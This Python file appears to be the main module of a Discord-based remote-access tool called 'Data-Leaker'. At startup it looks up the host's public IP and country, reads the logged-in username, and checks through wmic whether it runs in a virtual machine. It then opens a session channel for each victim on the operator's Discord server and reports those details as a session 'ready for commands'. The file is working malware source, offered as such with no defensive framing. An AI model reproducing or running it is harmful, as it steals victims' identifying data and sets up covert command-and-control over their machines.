"""""!
********************************************************************************
@file   bot_main.py
@brief  Main entry point for the Discord bot, initializes commands and events.
********************************************************************************
"""

import discord
from discord.ext import commands
from commands import setup as setup_commands  

# Set your Discord bot token here
TOKEN = "YOUR_TOKEN"

# Define bot with prefix
intents = discord.Intents.all()
client = discord.Client(intents=intents)
bot = commands.Bot(command_prefix='!', intents=intents)

# Call the setup function to load commands
setup_commands(bot)


@bot.event
async def on_ready():
    import platform
    import urllib.request
    import json
    import ctypes
    import os
    from datetime import datetime

    # Fetch system and geolocation details
    with urllib.request.urlopen("https://geolocation-db.com/json") as url:
        data = json.loads(url.read().decode())
        country = data['country_name']
        ip = data['IPv4']

    # Detect if running in a VM
    def check_vm():
        import subprocess
        try:
            output = subprocess.check_output("wmic computersystem get model", shell=True, stderr=subprocess.DEVNULL)
            if any(term in output.decode().lower() for term in ["virtual", "vmware", "virtualbox"]):
                return "Yes"
            return "No"
        except Exception:
            return "Unknown"

    isvm = check_vm()

    # Get the current time in HH:MM format
    current_time = datetime.now().strftime("%H:%M")

    # Username and channel name
    username = os.getlogin()
    channel_name = f"{username} - {current_time}"

    # Get the first guild (server) the bot is connected to
    guild = bot.guilds[0]  # Ensure the bot is added to at least one guild

    # Check if the channel already exists
    existing_channel = discord.utils.get(guild.text_channels, name=channel_name)
    if not existing_channel:
        new_channel = await guild.create_text_channel(channel_name)
    else:
        new_channel = existing_channel

    # Prepare the embed message
    embed = discord.Embed(
        title="🕴️ Data-Leaker - New Session Created!",
        description="A new session is now active and ready for commands.",
        color=discord.Color.purple(),
    )
    embed.add_field(name="💻 Session", value=f"`{channel_name}`", inline=False)
    embed.add_field(name="👤 Username", value=f"`{username}`", inline=False)
    embed.add_field(name="🌍 Country", value=f"`{country}`", inline=False)
    embed.add_field(name="📡 IP Address", value=f"`{ip}`", inline=False)
    embed.add_field(name="🖥️ Is VM", value=f"`{isvm}`", inline=False)
    embed.set_footer(text="Session started successfully!")

    # Send the embed message in the new channel
    await new_channel.send(embed=embed)

    # Update bot status
    game = discord.Game(f"Session for {username}")
    await bot.change_presence(status=discord.Status.online, activity=game)

# Run bot
bot.run(TOKEN)
